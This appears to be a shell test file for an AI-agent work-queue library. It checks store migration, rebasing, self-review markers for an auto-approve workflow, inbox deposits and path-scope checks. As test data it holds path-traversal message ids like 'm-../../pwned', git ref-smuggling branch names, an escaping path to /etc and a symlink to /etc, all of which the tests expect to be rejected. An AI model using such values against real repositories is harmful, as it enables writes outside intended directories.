check "candidates: a task id is refused"          "2" "$(hero_goal_candidates 2 "$G" >/dev/null 2>&1; echo $?)"
check "candidates: an active goal is accepted"    "0" "$(hero_goal_candidates 53 "$G" >/dev/null 2>&1; echo $?)"
check "candidates: a missing store is an error"   "1" "$(hero_goal_candidates 50 "$TMP/definitely-not-a-store" >/dev/null 2>&1; echo $?)"
# zsh does not word-split an unquoted list, so a guard written as
# `for p in $paths` checks only the first path there and passes 15.
if command -v zsh >/dev/null 2>&1; then
  check "candidates: same list under zsh" "$OUTG" "$(zsh -c ". '$LIB'; hero_goal_candidates 50 '$G'" 2>/dev/null)"
fi


# ---------- hero_work_store migration ---------------------------------------
#
# The only mutating function: an mv of the agent's entire work queue. Each
# case pins a path a refactor of the migration loop could silently drop.

R1="$TMP/mig1"; git init -q "$R1"
mkdir "$R1/my-work"; printf -- '---\nid: 1\ntitle: L\nstatus: todo\ndepends_on: []\n---\n' > "$R1/my-work/001-x.md"
S1="$(hero_work_store "$R1" 2>/dev/null)"
check "store: returns the .plans path"     "$R1/.plans" "$S1"
check "store: legacy item migrated"        "yes" "$([ -e "$R1/.plans/001-x.md" ] && echo yes)"
check "store: legacy dir gone after move"  "yes" "$([ ! -e "$R1/my-work" ] && echo yes)"
grep -qxF ".plans/" "$R1/.git/info/exclude"
check "store: .plans excluded in the TARGET repo" "0" "$?"
check "store: second call is idempotent"   "$R1/.plans" "$(hero_work_store "$R1" 2>/dev/null)"

# Symlink refusal, only when a migration would actually happen. A stale
# legacy symlink next to a healthy .plans/ must not brick the store.
R2="$TMP/mig2"; git init -q "$R2"; ln -s /etc "$R2/my-work"
hero_work_store "$R2" >/dev/null 2>&1
check "store: symlinked legacy refused when migrating" "1" "$?"
check "store: no .plans created on refusal" "yes" "$([ ! -e "$R2/.plans" ] && echo yes)"
mkdir "$R2/.plans"
S2="$(hero_work_store "$R2" 2>/dev/null)"
check "store: healthy .plans survives a legacy symlink" "$R2/.plans" "$S2"

# Both legacy dirs: my-work (newer) wins; shadowed plan-work is warned loudly.
R3="$TMP/mig3"; git init -q "$R3"
mkdir "$R3/my-work" "$R3/plan-work"; touch "$R3/my-work/a.md" "$R3/plan-work/b.md"
ERR3="$(hero_work_store "$R3" 2>&1 >/dev/null)"
check "store: my-work wins over plan-work" "yes" "$([ -e "$R3/.plans/a.md" ] && echo yes)"
printf '%s' "$ERR3" | grep -q "both plan-work/ and .plans/ exist"
check "store: shadowed plan-work warned loudly" "0" "$?"

# A worktree shares the primary checkout's store.
# pre-commit exports GIT_DIR for the outer repo; `git worktree add` must not
# see it or the worktree is created against this repo itself.
R5="$TMP/wt-main"; git init -q "$R5"; git -C "$R5" -c user.email=t@t -c user.name=t commit -q --allow-empty -m init
(unset GIT_DIR GIT_WORK_TREE GIT_INDEX_FILE; git -C "$R5" worktree add -q "$TMP/wt-side" -b side 2>/dev/null)
# hero_store_path is the read-only half: it must answer without creating the
# store or touching the exclude file, or resume-state becomes a writer.
R6="$TMP/r6"; git init -q "$R6"
check "store_path: prints the store path"             "$R6/.plans" "$(hero_store_path "$R6")"
check "store_path: does not create the store"         "no" "$([ -e "$R6/.plans" ] && echo yes || echo no)"
check "store_path: exclude untouched"                 "no" "$(grep -qs "\.plans" "$R6/.git/info/exclude" && echo yes || echo no)"
check "store: a worktree resolves to the primary checkout's .plans" \
  "$(cd "$R5" && pwd -P)/.plans" "$(hero_work_store "$TMP/wt-side" 2>/dev/null)"

# ---------- hero_rebase_on_base ---------------------------------------------
#
# Mutating (rebase + force-with-lease push), so every branch of it is pinned
# against a real origin: up to date, behind-and-clean, conflict (must abort
# and leave the branch as it was), dirty tree, and the worktree predicate.

(
  unset GIT_DIR GIT_WORK_TREE GIT_INDEX_FILE
  export GIT_AUTHOR_NAME=t GIT_AUTHOR_EMAIL=t@t GIT_COMMITTER_NAME=t GIT_COMMITTER_EMAIL=t@t
  O="$TMP/origin.git"; git init -q --bare "$O"
  A="$TMP/cloneA"; git clone -q "$O" "$A" 2>/dev/null
  cd "$A" && git checkout -q -b main && echo base > f && git add f && git commit -q -m base && git push -q -u origin main 2>/dev/null
  git checkout -q -b feat && echo feat > g && git add g && git commit -q -m feat && git push -q -u origin feat 2>/dev/null
  hero_rebase_on_base main 2>/dev/null; echo "current=$?"
  # main moves underneath (another clone), no overlap → rebase + push.
  B="$TMP/cloneB"; git clone -q "$O" "$B" 2>/dev/null
  (cd "$B" && git checkout -q main && echo more > h && git add h && git commit -q -m more && git push -q origin main 2>/dev/null)
  hero_rebase_on_base main 2>/dev/null; echo "rebased=$?"
  echo "hasbase=$(git merge-base --is-ancestor origin/main HEAD && echo yes)"
  echo "pushed=$(git rev-parse HEAD)=$(git rev-parse origin/feat)"
  # Conflict: both sides edit f. Must abort, branch unchanged.
  (cd "$B" && echo theirs > f && git commit -q -am theirs && git push -q origin main 2>/dev/null)
  echo mine > f && git commit -q -am mine; BEFORE=$(git rev-parse HEAD)
  hero_rebase_on_base main 2>"$TMP/conflict.err"; echo "conflict=$?"
  echo "unchanged=$([ "$(git rev-parse HEAD)" = "$BEFORE" ] && echo yes)"
  echo "norebase=$([ ! -d .git/rebase-merge ] && [ ! -d .git/rebase-apply ] && echo yes)"
  echo "named=$(grep -c '^  f$' "$TMP/conflict.err")"
  echo dirty > g
  hero_rebase_on_base main 2>/dev/null; echo "dirty=$?"
  git checkout -q -- g
  hero_rebase_on_base 'bad name' 2>/dev/null; echo "badbase=$?"
  git worktree add -q "$TMP/wt-rb" -b wt-rb 2>/dev/null
  hero_in_worktree "$TMP/wt-rb"; echo "wt=$?"
  hero_in_worktree "$A"; echo "primary=$?"
) > "$TMP/rebase.out" 2>/dev/null
r() { sed -n "s/^$1=//p" "$TMP/rebase.out"; }
check "rebase: up to date returns 0"                     "0"   "$(r current)"
check "rebase: behind and clean rebases, returns 0"      "0"   "$(r rebased)"
check "rebase: base is now an ancestor"                  "yes" "$(r hasbase)"
check "rebase: pushed with lease (origin matches HEAD)"  "yes" "$([ "$(r pushed | cut -d= -f1)" = "$(r pushed | cut -d= -f2)" ] && echo yes)"
check "rebase: conflict returns 1"                       "1"   "$(r conflict)"
check "rebase: conflict leaves the branch unchanged"     "yes" "$(r unchanged)"
check "rebase: conflict leaves no rebase in progress"    "yes" "$(r norebase)"
check "rebase: conflict names the file"                  "1"   "$(r named)"
check "rebase: dirty tree returns 2"                     "2"   "$(r dirty)"
check "rebase: invalid base returns 2"                   "2"   "$(r badbase)"
check "worktree: a linked worktree is detected"          "0"   "$(r wt)"
check "worktree: the primary checkout is not"            "1"   "$(r primary)"

# ---------- hero_compose_port ------------------------------------------------
C="$TMP/compose"; mkdir -p "$C/a" "$C/b" "$C/c" "$C/d"
printf 'ports:\n  - "2222:3000"\n' > "$C/a/docker-compose.dev.yaml"
printf 'ports:\n  - ${HOST_PORT:-1111}:3000\n' > "$C/a/docker-compose.dev.yml"
check "compose: .yaml is read before .yml" "2222" "$(hero_compose_port "$C/a")"
printf 'ports:\n  - "4444:3000"\n  - ${HOST_PORT:-3333}:3000\n' > "$C/b/compose.yaml"
check "compose: HOST_PORT default beats an earlier literal" "3333" "$(hero_compose_port "$C/b")"
printf 'ports:\n  # - ${HOST_PORT:-6666}:3000\n  - target: 3000\n    published: 7777\n' > "$C/c/docker-compose.yaml"
check "compose: commented-out HOST_PORT ignored, long-syntax published read" "7777" "$(hero_compose_port "$C/c")"
check "compose: no compose file is -" "-" "$(hero_compose_port "$C/d")"

# Explicit-root safety: run from a NON-repo cwd, the store must land in (and
# only mutate) the target repo, previously the exclude writes hit the cwd.
R4="$TMP/mig4"; git init -q "$R4"
NOREPO="$TMP/norepo"; mkdir -p "$NOREPO"
S4="$(cd "$NOREPO" && hero_work_store "$R4" 2>/dev/null)"
check "store: explicit root works from non-repo cwd" "$R4/.plans" "$S4"
grep -qxF ".plans/" "$R4/.git/info/exclude"
check "store: excludes written to the target repo" "0" "$?"
hero_work_store "$NOREPO" >/dev/null 2>&1
check "store: non-repo root still refused" "1" "$?"

# ---------- branch-name gate -----------------------------------------------
#
# hero_field's character gate cannot catch a value that is a valid STRING but
# not a valid BRANCH: git reads these as something other than the branch they
# resemble. This gate existed but was never wired to a caller.

branch_case() { # value expected
  printf '# H\n\n- default-branch: %s\n' "$1" > "$TMP/cfg/HERO.md"
  check "branch: $1" "$2" "$(hero_default_branch "$TMP/cfg" 2>/dev/null)"
}
branch_case "main:refs/heads/evil" "main"
branch_case "main^"                "main"
branch_case "@{u}"                 "main"
branch_case ".."                   "main"
branch_case "develop"              "develop"
branch_case "release/2.0"          "release/2.0"

# ---------- report ---------------------------------------------------------

# ---------- hero_self_review_count -----------------------------------------
#
# The stub honors --jq: a stub that cats raw JSON makes the function print an
# array, which compares equal to nothing and passes an assertion by accident.
mkdir -p "$TMP/ghbin"
cat > "$TMP/ghbin/gh" <<'GH'
#!/bin/sh
[ -n "${GH_FAIL:-}" ] && exit 1
Q=""
while [ $# -gt 0 ]; do [ "$1" = --jq ] && { shift; Q=$1; }; shift; done
if [ "$Q" = ".login" ]; then echo me; else jq "$Q" "$(dirname "$0")/comments.json"; fi
GH
chmod +x "$TMP/ghbin/gh"
cat > "$TMP/ghbin/comments.json" <<'JSON'
[{"body":"lgtm","user":{"login":"me"}},
 {"body":"<!-- ai-hero:self-review -->","user":{"login":"stranger"}},
 {"body":"<!-- ai-hero:self-review -->","user":{"login":"me"}}]
JSON
check "self-review count: only own marker comments"  "1" "$(PATH="$TMP/ghbin:$PATH" hero_self_review_count 7)"
check "self-review count: gh failure prints nothing" ""  "$(GH_FAIL=1 PATH="$TMP/ghbin:$PATH" hero_self_review_count 7 2>/dev/null)"
GH_FAIL=1 PATH="$TMP/ghbin:$PATH" hero_self_review_count 7 >/dev/null 2>&1
check "self-review count: gh failure returns non-zero" "no" "$([ $? -eq 0 ] && echo yes || echo no)"
# The workflow carries its own copy of the marker; the two must agree.
check "self-review marker matches the workflow's" "yes" "$(grep -q "$HERO_SELF_REVIEW_MARKER" "$(dirname "$0")/../.github/workflows/auto-approve.yaml" && echo yes || echo no)"

# ---------- hero_self_review_fixes_count -----------------------------------
#
# The findings comment and the improvements comment carry the SAME marker, so
# the fixes count must separate them on the word "improvements". A fixture
# with only the findings comment is the case the gate exists to reject.
cat > "$TMP/ghbin/comments.json" <<'JSON'
[{"body":"lgtm","user":{"login":"me"}},
 {"body":"## Self-Review\n<!-- ai-hero:self-review -->\nfindings","user":{"login":"me"}}]
JSON
check "fixes count: findings alone is zero"       "0" "$(PATH="$TMP/ghbin:$PATH" hero_self_review_fixes_count 7)"
check "fixes count: findings still counted"       "1" "$(PATH="$TMP/ghbin:$PATH" hero_self_review_count 7)"

cat > "$TMP/ghbin/comments.json" <<'JSON'
[{"body":"## Self-Review\n<!-- ai-hero:self-review -->\nfindings","user":{"login":"me"}},
 {"body":"## Self-Review - Improvements\n<!-- ai-hero:self-review -->\nfixed","user":{"login":"me"}},
 {"body":"## Self-Review - Improvements\n<!-- ai-hero:self-review -->","user":{"login":"stranger"}}]
JSON
check "fixes count: improvements comment counts"  "1" "$(PATH="$TMP/ghbin:$PATH" hero_self_review_fixes_count 7)"
check "fixes count: gh failure returns non-zero" "no" "$(GH_FAIL=1 PATH="$TMP/ghbin:$PATH" hero_self_review_fixes_count 7 >/dev/null 2>&1; [ $? -eq 0 ] && echo yes || echo no)"

# The workflow evaluates the same two halves; a gate that stopped requiring
# the second would leave this helper with no caller and no reason to exist.
check "workflow requires the fixes half" "yes" "$(grep -q 'SELF_REVIEW_FIXES' "$(dirname "$0")/../.github/workflows/auto-approve.yaml" && echo yes || echo no)"

# The bug this marker exists for: the findings comment lists suggestions, and
# a suggestion saying "improvements" made the findings comment satisfy the
# fixes half by itself. The word appears freely in model-written review prose,
# so matching it was matching nothing.
cat > "$TMP/ghbin/comments.json" <<'JSON'
[{"body":"## Self-Review\n<!-- ai-hero:self-review -->\n### Suggestions (2)\n- small improvements to naming","user":{"login":"me"}}]
JSON
check "fixes count: a suggestion saying improvements is not a fixes comment" "0" "$(PATH="$TMP/ghbin:$PATH" hero_self_review_fixes_count 7)"
check "fixes count: that comment is still findings"                          "1" "$(PATH="$TMP/ghbin:$PATH" hero_self_review_count 7)"

# The marker is what survives the humanizer; the heading is not.
cat > "$TMP/ghbin/comments.json" <<'JSON'
[{"body":"## Self-Review\n<!-- ai-hero:self-review -->\nfindings","user":{"login":"me"}},
 {"body":"## Self-review: what I changed\n<!-- ai-hero:self-review -->\n<!-- ai-hero:self-review-fixes -->","user":{"login":"me"}}]
JSON
check "fixes count: marker counts with the heading rewritten" "1" "$(PATH="$TMP/ghbin:$PATH" hero_self_review_fixes_count 7)"
check "findings excludes the fixes comment"                   "1" "$(PATH="$TMP/ghbin:$PATH" hero_self_review_count 7)"

# Both halves from one comment is what made the gate's `&&` vacuous.
cat > "$TMP/ghbin/comments.json" <<'JSON'
[{"body":"## Self-Review\n<!-- ai-hero:self-review -->\n<!-- ai-hero:self-review-fixes -->\nboth in one","user":{"login":"me"}}]
JSON
check "one comment cannot be both halves" "0" "$(PATH="$TMP/ghbin:$PATH" hero_self_review_count 7)"

# The gate and the helpers must agree on the marker, or ship-pr green means
# auto-approve red.
check "workflow carries the fixes marker" "yes" "$(grep -q 'ai-hero:self-review-fixes' "$(dirname "$0")/../.github/workflows/auto-approve.yaml" && echo yes || echo no)"
check "review-pr posts the fixes marker"  "yes" "$(grep -q 'ai-hero:self-review-fixes' "$(dirname "$0")/../skills/wayfare-review-pr/SKILL.md" && echo yes || echo no)"

# A review OF this gate quotes the strings the gate matches on. The legacy
# fallback was unanchored and read this PR's own findings comment as the
# fixes comment, which collapsed findings to zero and refused a ship. The
# fallback matches a HEADING now, and prose mentioning both words does not.
cat > "$TMP/ghbin/comments.json" <<'JSON'
[{"body":"## Self-Review\n<!-- ai-hero:self-review -->\n- the gate accepts a legacy Self-Review heading and the word improvements","user":{"login":"me"}}]
JSON
check "fixes count: prose discussing the gate is not the fixes comment" "0" "$(PATH="$TMP/ghbin:$PATH" hero_self_review_fixes_count 7)"
check "findings survives prose discussing the gate"                     "1" "$(PATH="$TMP/ghbin:$PATH" hero_self_review_count 7)"

# ---------- shape, suspension, the inbox, local skills ---------------------
# `shape` decides what a task's Definition of Done asserts and NOTHING about
# readiness, so a defect and a story list identically. Suspension is a FLAG
# (docs/PLAN.md): the item keeps its status and `awaiting` is what suspends
# it, so a suspended item is never READY and never satisfies a dependency
# while the sibling's answer is open.
W3="$TMP/w3/.plans"
mkdir -p "$W3/items" "$W3/inbox"
W="$W3"
plan "$W3"
sitem() { # file id title status shape
  printf -- '---\nid: %s\ntype: task\nshape: %s\ntitle: %s\nstatus: %s\ndepends_on: []\n---\n' \
    "$2" "$5" "$3" "$4" > "$W3/items/$1"
}
sitem 090-bug.md 90 "Badge clips at 320px" "ready" "defect"
sitem 091-bugtodo.md 91 "Untriaged defect" "accepted" "defect"
sitem 095-visual.md 95 "Header spacing" "ready" "visual"
sitem 096-dep.md 96 "Bump lodash" "ready" "dependency"
# Written by hand: sitem has no slot for awaiting, and the field must sit
# INSIDE the frontmatter for the reader to see it.
printf -- '---\nid: 92\ntype: task\ntitle: Waiting on design-system\nstatus: review\nsuspended_at: 2026-09-01\nawaiting:\n  - m-7f3a9c\n  - m-c0fbd5\ndepends_on: []\n---\n' > "$W3/items/092-susp.md"
# No `awaiting` at all: nothing suspends it, so it simply lists at its status.
# The old schema needed a `suspended` status here and an `invalid` row when
# the two disagreed; with the flag there is no pair that can disagree.
printf -- '---\nid: 94\ntype: task\ntitle: Nothing to wait for\nstatus: ready\nawaiting: []\ndepends_on: []\n---\n' > "$W3/items/094-noawait.md"
# A TERMINAL item is not waiting on anything, whatever stale ids it carries.
printf -- '---\nid: 97\ntype: task\ntitle: Shipped, stale awaiting\nstatus: done\nawaiting:\n  - m-old\ndepends_on: []\n---\n' > "$W3/items/097-doneawait.md"
printf -- '---\nid: 93\ntype: task\ntitle: Blocked on the wait\nstatus: ready\ndepends_on: [92]\n---\n' > "$W3/items/093-dep.md"
printf -- '---\nid: 98\ntype: task\ntitle: Waiting on shipped work\nstatus: ready\ndepends_on: [97]\n---\n' > "$W3/items/098-afterdone.md"
OUT3="$(hero_ready_items "$W3" 2>/dev/null)"
check "shape: a defect at ready is READY"        "READY"     "$(state_of 090-bug.md "$OUT3")"
check "shape: a defect at accepted is backlog"   "backlog"   "$(state_of 091-bugtodo.md "$OUT3")"
check "shape: visual lists like any other task"  "READY"     "$(state_of 095-visual.md "$OUT3")"
check "shape: dependency lists like any other task" "READY"  "$(state_of 096-dep.md "$OUT3")"
check "suspended: awaiting overrides the status row" "suspended" "$(state_of 092-susp.md "$OUT3")"
# Block-form awaiting, two ids, and the age: the single-line reader printed
# the block form as empty, which rendered a real wait as one with nothing to
# wait for.
check "suspended: row names count, ids and age"  "yes"       "$(printf '%s' "$OUT3" | grep -q 'awaiting 2: m-7f3a9c m-c0fbd5 — since 2026-09-01' && echo yes || echo no)"
check "suspended: empty awaiting leaves the status alone" "READY" "$(state_of 094-noawait.md "$OUT3")"
check "suspended: a terminal item is never suspended" "done" "$(state_of 097-doneawait.md "$OUT3")"
check "suspended: a done item with stale awaiting still unblocks" "READY" "$(state_of 098-afterdone.md "$OUT3")"
check "awaiting parser: block form"               "m-7f3a9c m-c0fbd5" "$(hero_item_awaiting "$W3/items/092-susp.md" | tr '\n' ' ' | sed 's/ $//')"
check "suspended: a dependent stays blocked"      "blocked"   "$(state_of 093-dep.md "$OUT3")"

# `blocked_on` is the flag for a wait that is not a sibling's reply. It keeps
# the item's status, overrides the status row, and on a terminal item is
# ignored with a warning rather than blocking anything.
printf -- '---\nid: 160\ntype: task\ntitle: Needs the vendor key\nstatus: ready\nblocked_on: waiting on the vendor API key\nblocked_since: 2026-09-29\ndepends_on: []\n---\n' > "$W3/items/160-vendor.md"
printf -- '---\nid: 161\ntype: task\ntitle: Mid-flight and blocked\nstatus: active\nblocked_on: owner decision on pricing\ndepends_on: []\n---\n' > "$W3/items/161-activeblk.md"
printf -- '---\nid: 162\ntype: task\ntitle: Shipped with a stale block\nstatus: done\nblocked_on: old wait\ndepends_on: []\n---\n' > "$W3/items/162-doneblk.md"
printf -- '---\nid: 163\ntype: task\ntitle: After the vendor\nstatus: ready\ndepends_on: [160]\n---\n' > "$W3/items/163-afterblk.md"
printf -- '---\nid: 164\ntype: task\ntitle: Block cleared\nstatus: ready\nblocked_on:\ndepends_on: []\n---\n' > "$W3/items/164-cleared.md"
OUT3B="$(hero_ready_items "$W3" 2>"$TMP/blk.err")"
check "blocked_on: a ready task lists as blocked"        "blocked" "$(state_of 160-vendor.md "$OUT3B")"
check "blocked_on: row carries the reason and date"      "yes"     "$(printf '%s' "$OUT3B" | grep -q 'on: waiting on the vendor API key, since 2026-09-29' && echo yes || echo no)"
check "blocked_on: never in the READY tier"              "no"      "$(printf '%s' "$OUT3B" | grep '^READY' | grep -q 160-vendor && echo yes || echo no)"
check "blocked_on: an active task lists as blocked"      "blocked" "$(state_of 161-activeblk.md "$OUT3B")"
check "blocked_on: a done item is listed as done"        "done"    "$(state_of 162-doneblk.md "$OUT3B")"
check "blocked_on: a done item is warned about"          "yes"     "$(grep -q '162-doneblk.md is done and still carries blocked_on' "$TMP/blk.err" && echo yes || echo no)"
check "blocked_on: a dependent stays blocked"            "blocked" "$(state_of 163-afterblk.md "$OUT3B")"
check "blocked_on: an empty field leaves the task READY" "READY"   "$(state_of 164-cleared.md "$OUT3B")"
sed -i.bak '/^blocked_on:/d;/^blocked_since:/d' "$W3/items/160-vendor.md"; rm -f "$W3/items/160-vendor.md.bak"
check "blocked_on: deleting the field returns it to READY" "READY" "$(state_of 160-vendor.md "$(hero_ready_items "$W3" 2>/dev/null)")"
rm -f "$W3"/items/16[0-4]-*.md

printf -- '---\nmsg_id: m-1\ntype: bug\nstatus: new\n---\n' > "$W3/inbox/m-1.md"
printf -- '---\nmsg_id: m-2\ntype: ask\nstatus: answered\n---\n' > "$W3/inbox/m-2.md"
printf -- '---\nmsg_id: m-3\ntype: ask\n---\n' > "$W3/inbox/m-3.md"
printf -- '---\nmsg_id: m-4\ntype: ask\nstatus: NEW\n---\n' > "$W3/inbox/m-4.md"
printf -- '---\nmsg_id: m-5\ntype: ask\nstatus: bogus\n---\n' > "$W3/inbox/m-5.md"
printf -- '---\nmsg_id: m-6\ntype: ask\nstatus: claimed\n---\n' > "$W3/inbox/m-6.md"
# new, missing, upper-case NEW, and a typo all count as unread; answered and
# claimed do not, a typo that read as settled would hide a message forever.
check "inbox count: unread = new + missing + NEW + typo" "4" "$(hero_inbox_count "$W3")"
check "inbox count: claimed counted separately"        "1" "$(hero_inbox_count "$W3" claimed)"
check "inbox count: no inbox is 0"                     "0" "$(hero_inbox_count "$TMP/w/.plans")"
mkdir -p "$TMP/w4/.plans/inbox"
check "inbox count: empty inbox is 0"                  "0" "$(hero_inbox_count "$TMP/w4/.plans")"
if command -v zsh >/dev/null 2>&1; then
  check "inbox count: empty inbox is 0 under zsh"      "0" "$(zsh -c ". '$LIB'; hero_inbox_count '$TMP/w4/.plans'" 2>/dev/null)"
fi
check "inbox files never list as items"                "no" "$(printf '%s' "$OUT3" | grep -q 'm-1' && echo yes || echo no)"

# ---------- sending: id, dedupe probe, atomic deposit ----------------------
# The send half of docs/MESSAGES.md. Every sender runs these in order, so they
# live here rather than as prose each sender re-derives.
MID1="$(hero_msg_id)"; MID2="$(hero_msg_id)"
check "msg id: m- prefixed 6 hex"        "yes" "$(printf '%s' "$MID1" | grep -Eq '^m-[0-9a-f]{6}$' && echo yes || echo no)"
check "msg id: two draws differ"         "yes" "$([ "$MID1" != "$MID2" ] && echo yes || echo no)"
check "msg id: shape check accepts"      "yes" "$(hero_is_msg_id m-7f3a9c && echo yes || echo no)"
# `m-*` alone admits a path. The deposit builds inbox/$ID.md from this value,
# so a loose check is a write into any directory the sender can reach.
check "msg id: rejects a traversal id"   "no"  "$(hero_is_msg_id 'm-../../AGENTS' && echo yes || echo no)"
check "msg id: rejects a short draw"     "no"  "$(hero_is_msg_id 'm-ab' && echo yes || echo no)"
check "msg id: rejects uppercase"        "no"  "$(hero_is_msg_id 'm-7F3A9C' && echo yes || echo no)"

msg() { # file from about status [extra]
  { printf -- '---\nmsg_id: %s\ntype: bug\nfrom: %s\nto: ds\nabout: %s\nstatus: %s\n' "${1%.md}" "$2" "$3" "$4"
    [ -n "${5:-}" ] && printf '%s\n' "$5"
    printf -- '---\n'
  } > "$W3/inbox/$1"
}
msg m-aa1111.md hiro 27 new
msg m-aa2222.md hiro 28 answered
msg m-aa3333.md hiro 29 declined
check "msg find: live match returns its path" "$W3/inbox/m-aa1111.md" "$(hero_msg_find "$W3" hiro 27)"
check "msg find: live match returns 0"        "yes" "$(hero_msg_find "$W3" hiro 27 >/dev/null && echo yes || echo no)"
# A settled conversation is not a live duplicate: keep either of these
# matching and the sender can never raise the same subject twice.
check "msg find: answered does not match"     "no"  "$(hero_msg_find "$W3" hiro 28 >/dev/null 2>&1 && echo yes || echo no)"
check "msg find: declined does not match"     "no"  "$(hero_msg_find "$W3" hiro 29 >/dev/null 2>&1 && echo yes || echo no)"
check "msg find: other sender does not match" "no"  "$(hero_msg_find "$W3" web 27 >/dev/null 2>&1 && echo yes || echo no)"
check "msg find: no inbox returns non-zero"   "no"  "$(hero_msg_find "$TMP/w/.plans" hiro 27 >/dev/null 2>&1 && echo yes || echo no)"
# rc 2 and not 1: "I could not ask" must not read as "not sent yet", or the
# sender deposits into a store it never managed to check.
check "msg find: no inbox is rc 2, not rc 1"  "2"   "$(hero_msg_find "$TMP/w/.plans" hiro 27 >/dev/null 2>&1; echo $?)"
# An empty ABOUT matches every message with no `about:` field, so two
# unrelated asks from one repo dedupe against each other and the second is
# never sent. rc 2 (cannot ask) must not read as rc 1 (not sent yet).
hero_msg_find "$W3" hiro "" >/dev/null 2>&1
check "msg find: empty ABOUT is rc 2"         "2"   "$?"
# Liveness is the closed enum. A status outside it read as live would match
# forever and close the subject permanently.
msg m-aa4444.md hiro 31 queued
check "msg find: status outside enum is not live" "no" "$(hero_msg_find "$W3" hiro 31 >/dev/null 2>&1 && echo yes || echo no)"
# An expired await was settled by lapse, the sender already resumed. Holding
# the subject closed on it hangs the conversation with no way to reopen.
msg m-aa5555.md hiro 32 new "expires: 2000-01-01"
check "msg find: expired is not live"         "no"  "$(hero_msg_find "$W3" hiro 32 >/dev/null 2>&1 && echo yes || echo no)"
msg m-aa6666.md hiro 33 new "expires: 2999-12-31"
check "msg find: unexpired is live"           "yes" "$(hero_msg_find "$W3" hiro 33 >/dev/null 2>&1 && echo yes || echo no)"

printf -- '---\nmsg_id: m-bb1111\ntype: ask\nfrom: hiro\nto: ds\nabout: 30\nstatus: new\n---\n\n## Ask\n\nBody.\n' > "$TMP/draft.md"
DEST="$(hero_msg_deposit "$W3" m-bb1111 "$TMP/draft.md")"
check "deposit: lands at inbox/MSG_ID.md"     "$W3/inbox/m-bb1111.md" "$DEST"
check "deposit: content arrives whole"        "yes" "$(grep -q '## Ask' "$W3/inbox/m-bb1111.md" && echo yes || echo no)"
check "deposit: deposited message is unread"  "yes" "$(hero_msg_find "$W3" hiro 30 >/dev/null && echo yes || echo no)"
# Overwriting would destroy a message the recipient may already be acting on,
# and the sender keeps no copy of either one.
check "deposit: refuses to overwrite"         "no"  "$(hero_msg_deposit "$W3" m-bb1111 "$TMP/draft.md" >/dev/null 2>&1 && echo yes || echo no)"
# A target with no mailbox has no agent workflow to read one; creating the
# directory would be the second kind of write the standard bans. The body
# carries the matching id so this reaches the mailbox check rather than
# failing earlier for an unrelated reason.
printf -- '---\nmsg_id: m-cc1111\ntype: ask\nfrom: hiro\nto: ds\nabout: 36\nstatus: new\n---\n' > "$TMP/nomailbox.md"
check "deposit: refuses a missing inbox"      "no"  "$(hero_msg_deposit "$TMP/w/.plans" m-cc1111 "$TMP/nomailbox.md" >/dev/null 2>&1 && echo yes || echo no)"
# `|| true` is load-bearing: this file runs with `pipefail`, so the deposit's
# own non-zero status is the pipeline's status whatever grep finds.
check "deposit: names the missing mailbox"    "yes" "$({ hero_msg_deposit "$TMP/w/.plans" m-cc1111 "$TMP/nomailbox.md" 2>&1 >/dev/null || true; } | grep -q 'has no mailbox' && echo yes || echo no)"
check "deposit: rejects a non-message id"     "no"  "$(hero_msg_deposit "$W3" 42 "$TMP/draft.md" >/dev/null 2>&1 && echo yes || echo no)"
# The id becomes a path. This is the one that turns a confused sender into an
# arbitrary write in someone else's checkout.
check "deposit: rejects a traversal id"       "no"  "$(hero_msg_deposit "$W3" 'm-../../pwned' "$TMP/draft.md" >/dev/null 2>&1 && echo yes || echo no)"
check "deposit: no file escaped the inbox"    "no"  "$([ -e "$TMP/w3/pwned.md" ] && echo yes || echo no)"
check "deposit: rejects an unreadable body"   "no"  "$(hero_msg_deposit "$W3" m-cc2222 "$TMP/nope.md" >/dev/null 2>&1 && echo yes || echo no)"
# Glob-based readers key on the filename and repliers key on the body, so the
# two copies of the identity have to agree at the one chokepoint that sees both.
printf -- '---\nmsg_id: m-zzzzzz\ntype: ask\nfrom: hiro\nto: ds\nabout: 34\nstatus: new\n---\n' > "$TMP/mismatch.md"
check "deposit: rejects body msg_id mismatch" "no"  "$(hero_msg_deposit "$W3" m-dd1111 "$TMP/mismatch.md" >/dev/null 2>&1 && echo yes || echo no)"
printf -- '---\nmsg_id: m-ee1111\ntype: ask\nfrom: hiro\nto: ds\nabout: 35\nstatus: pending\n---\n' > "$TMP/badstatus.md"
check "deposit: rejects status outside enum"  "no"  "$(hero_msg_deposit "$W3" m-ee1111 "$TMP/badstatus.md" >/dev/null 2>&1 && echo yes || echo no)"
# No temp may survive ANY path, a recipient's glob reading a half-message is
# a request acted on in half. Asserted after the failure cases, not before.
check "deposit: leaves no temp behind"        "0" "$(find "$W3/inbox" -name '.*.tmp' | wc -l | tr -d ' ')"
if command -v zsh >/dev/null 2>&1; then
  check "msg find: empty inbox under zsh, rc 1" "no" "$(zsh -c ". '$LIB'; hero_msg_find '$TMP/w4/.plans' hiro 27" >/dev/null 2>&1 && echo yes || echo no)"
  # The empty-inbox case proves nullglob does not abort; it does not prove the
  # function still FINDS anything under zsh, which is the half that matters.
  check "msg find: matches under zsh"           "$W3/inbox/m-aa1111.md" "$(zsh -c ". '$LIB'; hero_msg_find '$W3' hiro 27" 2>/dev/null)"
fi


# ---------- admission path scope -------------------------------------------
# Criterion 3 of a goal turn's admission test. Mechanical because the other
# criteria are judgments made beside untrusted content; this one has to hold
# when that judgment is what is under attack.
check "within: exact match"                 "yes" "$(hero_path_within src/app src/app && echo yes || echo no)"
check "within: file under the scope dir"    "yes" "$(hero_path_within src/app/api.ts src/app && echo yes || echo no)"
check "within: any of several scopes"       "yes" "$(hero_path_within lib/x.ts src/app lib && echo yes || echo no)"
check "within: outside every scope"         "no"  "$(hero_path_within other/x.ts src/app lib && echo yes || echo no)"
# The trap a string-prefix check walks into: src/app must NOT contain
# src/application. Segment containment, not `case "$p" in "$s"*)`.
check "within: sibling sharing a prefix"    "no"  "$(hero_path_within src/application/x.ts src/app && echo yes || echo no)"
check "within: prefix dir, no separator"    "no"  "$(hero_path_within src/appfoo src/app && echo yes || echo no)"
# Declared strings from a git-excluded file, not paths on disk: there is
# nothing to canonicalize against, so `..` is refused rather than resolved.
check "within: .. in the path is refused"   "no"  "$(hero_path_within 'src/app/../../etc/x' src/app && echo yes || echo no)"
check "within: .. in the scope is refused"  "no"  "$(hero_path_within etc/x 'src/app/..' && echo yes || echo no)"
check "within: trailing slash on scope"     "yes" "$(hero_path_within src/app/x.ts src/app/ && echo yes || echo no)"
